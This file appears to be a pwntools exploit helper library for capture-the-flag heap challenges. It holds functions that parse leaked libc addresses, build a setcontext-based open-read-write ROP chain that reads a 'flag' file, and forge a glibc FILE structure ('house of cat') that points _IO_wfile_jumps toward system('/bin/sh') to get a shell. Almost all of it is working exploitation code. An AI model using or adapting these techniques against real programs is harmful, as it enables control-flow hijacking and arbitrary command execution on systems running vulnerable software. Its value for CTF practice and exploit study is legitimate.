
from pwn import *
from pwn import u64,p64

def show_addr(name,addr):
    success(f'{name} = {hex(addr)}')

def recv_addr(r:process,name:str,until:bytes =b'\x7f',offset:int = 0,junkUntil:bytes = b'',recvType:str = 'bytes')->int:
    addr = 0
    if junkUntil:
        r.recvuntil(junkUntil)
    context = r.recvuntil(until)
    print(context)
    
    if recvType == 'bytes':
        if not offset:
            addr = u64(context.ljust(8,b'\x00'))
        else:
            addr = u64(context[:offset].ljust(8,b'\x00'))

    elif recvType == 'str':
        if context.startswith(b'0x'):
            addr = int(context[2:offset].decode(),16)
        else:
            addr = int(context[:offset].decode(),16)
            
    show_addr(name,addr)
    return addr

def setcontext_orw(libc:elf,orw_addr:int,rdi_addr:int):
    rop = ROP(libc)
    rop.base = orw_addr + 0x8
    rop.open(b'flag',0,0)
    rop.read(3,orw_addr + 0x10 +0x100,0x30)
    rop.write(1,orw_addr + 0x10 +0x100,0x30)
    rdi_payload =  p64(0) + p64(rdi_addr) + p64(0) * 2 + p64(libc.sym['setcontext']+61) + p64(0) #0x30
    rdi_payload += p64(0) * int(0x70 / 8) + p64(orw_addr+0x10) + rop.chain()[:8]
        # 0x0000000000151990 : mov rdx, qword ptr [rdi + 8] ; mov qword ptr [rsp], rax ; call qword ptr [rdx + 0x20] 使用的magic
    return rop.chain()[8:],rdi_payload

def house_of_cat(libc:elf,fakeio_addr:int):
    fakeio = FileStructure()
    fakeio.flags = b'/bin/sh\x00'
    fakeio._IO_write_ptr = 1
    fakeio._IO_backup_base = 0x100
    fakeio._lock = fakeio_addr+0x200
    fakeio._wide_data = fakeio_addr+0x30
    fakeio.vtable = libc.sym['_IO_wfile_jumps'] + 0x30
    fakeio = bytes(fakeio)
    shell =p64(fakeio_addr+0x30+0xe0+0x40).rjust(0x38,b'\x00')                         
    shell+=p64(libc.sym['system']).rjust(0x58,b'\x00')
    return fakeio + shell

